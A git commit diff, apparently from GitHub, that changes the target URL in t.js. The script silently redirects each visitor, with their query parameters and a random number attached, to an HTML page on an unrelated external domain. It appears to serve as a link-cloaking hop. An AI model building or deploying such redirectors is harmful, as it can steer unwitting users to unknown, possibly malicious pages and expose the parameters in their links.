21d93e8af936d9d7dcc84b7387b8c3228957aab7
reyalpilareyalpila <167016503+reyalpilareyalpila@users.noreply.github.com>
2024-08-16 02:02:25 +0800

    Update t.js

--- t.js
+++ t.js
@@ -1,4 +1,4 @@
-var urll="http://image.qiniu.fangdadi.com/wxavatar/20240815_20240815090601A683.html"
+var urll="https://dxxapp.daliyu.cc/ckldapp/up/20240815/09033767601df9.html"
 var params = new URLSearchParams(location.href.split('?')[1]);
   var sjs = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
   window.location.replace(urll + "?" + sjs + "?" + params);
